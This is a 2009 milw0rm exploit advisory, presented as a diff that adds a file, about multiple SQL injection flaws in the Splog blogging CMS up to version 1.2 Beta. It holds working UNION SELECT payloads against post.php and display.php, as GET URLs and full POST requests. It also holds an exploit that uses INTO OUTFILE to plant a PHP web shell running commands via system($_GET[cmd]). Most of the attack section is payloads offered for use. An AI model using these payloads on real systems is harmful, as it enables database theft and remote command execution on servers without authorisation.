@@ -1,0 +1,138 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES	             	     |
+|--------------------------------------------------------------------------------------------|
+|                                 |   Splog <= v-1.2 Beta    |		    	             |
+|  CMS INFORMATION:          	   --------------------------	               	             |
+|										             |
+|-->WEB: http://sourceforge.net/projects/splog/				       		     |
+|-->DOWNLOAD: http://sourceforge.net/projects/splog/			                     |
+|-->DEMO: N/A										     |
+|-->CATEGORY: CMS / Blogging								     |
+|-->DESCRIPTION: Splog is a simple PHP and MySQL blogging framework allowing                 |
+|		full integration into a website by being designed for use...                 |
+|-->RELEASED: 2009-06-01								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: N/A									             |
+|-->CATEGORY: SQL INJECTION							             |
+|-->AFFECT VERSION: <= 1.2-Beta (Checked previous versions are also vulns)		     |
+|-->Discovered Bug date: 2009-06-08							     |
+|-->Reported Bug date: 2009-06-09							     |
+|-->Fixed bug date: 2009-06-10								     |
+|-->Info patch(1.3): http://sourceforge.net/projects/splog/				     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+-------------------
+PROOF OF CONCEPT:
+-------------------
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF/ON +++++++++++++++++--------->>>>
+
+
+
+[++] GET var --> 'id'
+
+[++] File vuln --> 'post.php'
+
+
+~~~> http://[HOST]/[PATH]/post.php?id=-1+UNION+SELECT+1,user(),database(),version(),user(),database()%23
+
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+
+[++] POST var --> 'pCategory'
+
+[++] File vuln --> 'display.php'
+
+
+POST http://[HOST]/[PATH]/display.php HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
+Referer: http://[HOST]/[PATH]/display.php
+Content-Type: application/x-www-form-urlencoded
+pCategory=-1'+UNION+SELECT+1,2,3,4,5,6# <--- INJECTION
+
+
+[++[Return]++] ~~~~~> user, version or database.
+
+
+----------
+EXPLOIT:
+----------
+
+
+<<<<---------++++++++++++++ Extra-Condition: privileges to create files +++++++++++++++++--------->>>>
+
+
+[GET]~~~~~> http://[HOST]/[PATH]/post.php?id=-1+UNION+ALL+SELECT+'<HTML><title>SPLOG <= 1.2 Beta--SHELL BY --Y3NH4CK3R--></title>','<body text=ffffff bgcolor=000000><center><h1>YOUR SHELL IS ON!<br>','</h1></center><br><br><font color=ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2>','</font><h3>Command Result:</h3><?php system($_GET[cmd]); ?>','<br><br><font color=ff0000>','<h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body></HTML>'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'%23
+
+[POST]~~~~~>
+
+POST http://[HOST]/[PATH]/display.php HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
+Referer: http://[HOST]/[PATH]/display.php
+Content-Type: application/x-www-form-urlencoded
+pCategory=-1'+UNION+ALL+SELECT+'<HTML><title>SPLOG <= 1.2 Beta--SHELL BY --Y3NH4CK3R--></title>','<body text=ffffff bgcolor=000000><center><h1>YOUR SHELL IS ON!<br>','</h1></center><br><br><font color=ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2>','</font><h3>Command Result:</h3><?php system($_GET[cmd]); ?>','<br><br><font color=ff0000>','<h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body></HTML>'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'# <--- INJECTION
+
+
+[++[Return]++] ~~~~~> Your shell in http://[HOST]/[PATH]/shell.php
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+
+# milw0rm.com [2009-06-11]
